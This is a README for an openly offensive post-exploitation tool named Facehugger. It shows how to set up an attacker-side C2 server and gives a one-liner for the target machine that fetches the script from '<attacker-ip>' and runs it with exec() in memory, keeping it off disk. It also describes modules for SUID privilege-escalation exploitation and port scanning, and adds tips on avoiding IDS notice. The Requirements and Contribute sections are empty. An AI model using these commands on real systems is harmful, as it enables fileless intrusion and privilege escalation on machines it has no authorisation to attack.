# Facehugger

![free-hugs](https://www.clipartmax.com/png/full/426-4262327_free-hugs-clip-art.png)

A versatile and modular post-exploitation framework. Enumerate, Escalate and pivot while keeping your scripts in ram and off disk.

## Usage

To use Facehugger you fist need to configure your attacking machine to act as a C2 server from which Facehugger can load resources. 
Facehugger works over http (soon to be https) and hence there are a number of ways of setting up the host however the method I recommend is to use the python simple http server module. 
To set this up on your attacking machine if you have sudo rights run:
```
git clone https://github.com/CellEight/Facehugger.git
cd Facehugger
sudo python3 -m http.server 80
```

If you lack sudo rights (for example in a situation in which you are pivoting from a machine on which you only have access to a unprivileged account) simply change port 80 to a port above 1000 (eg. 8080) as this will remove the need for sudo rights although it may be more suspicious to any IDS on the network.

Facehugger currently doesn't implement any kind of readline functionality to allow for command replay so I reccomend running it with rlwrap if it's installed on the target system.
If you have already moved the script onto the target system then run
```
python3 facehugger.py
rlwrap python3 facehugger.py # or with rlwrap
```
If you wish to run Facehugger 100% in memory and what I recommend is to use python to get facehugger.py over the network and execute it directly without touching metal. 
To do this simply run the following on the target machine:
```
python3 -c "import requests; exec(requests.get('http://<attacker-ip>/facehugger.py').text)"
```

## Modules

Beyond the base functionality of Facehugger a couple of modules have been implemented that allow for more aggressive post exploitation.
The currently working modules are

* suidenum - This module allows for automated enumeration and exploitation of common suid vulnerablities by scraping GTFO bins
* portscan - A simple port scan with option banner grabbing capabilties

With many more on the way.
All modules are download from the C2 server into RAM and then directly executed with `exec()`.
To download a module form the C2 server from the Facehugger command line just use the `load` command as follows
```
facehugger~# load <name-of-module>
```

To make a module active or change the currently active use the `set module` command

```
facehugger~# set module <name-of-module>
```

To see details of the functionality and usage of the module just use the `usage` command after making it active

```
facehugger~module# usage
```
To list it configurable attributes use `list attr`:
```
facehugger~module# list attr
```
To set the value of a particular attribute use `set attr`:
```
facehugger~module#set attr <attribute> <value>
```
And once you have set all the necessary attributes of a module you can use the `run` command to execute it:
```
facehugger~module# run
```
## Requirements


## Contribute

Any kind of pull requests are welcome from spelling corrections to entire new modules.
To write your own module just create a child class of 'Module' that implements the following methods:

And has an following fields:
